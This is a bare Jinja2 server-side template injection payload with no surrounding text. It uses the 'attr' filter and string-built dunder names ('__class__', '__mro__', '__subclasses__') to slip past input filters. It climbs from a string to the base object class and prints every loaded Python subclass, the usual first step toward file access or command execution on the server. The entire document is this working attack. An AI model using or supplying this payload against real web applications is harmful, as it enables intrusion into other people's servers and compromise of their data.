{% set string = "ssti" %} 
{% set class = "__class__" %} 
{% set mro = "__mro__" %} 
{% set subclasses = "__subclasses__" %} 
{% set mro_r = string|attr(class)|attr(mro) %} 
{% set subclasses_r = mro_r[1]|attr(subclasses)() %} 
{{ subclasses_r}}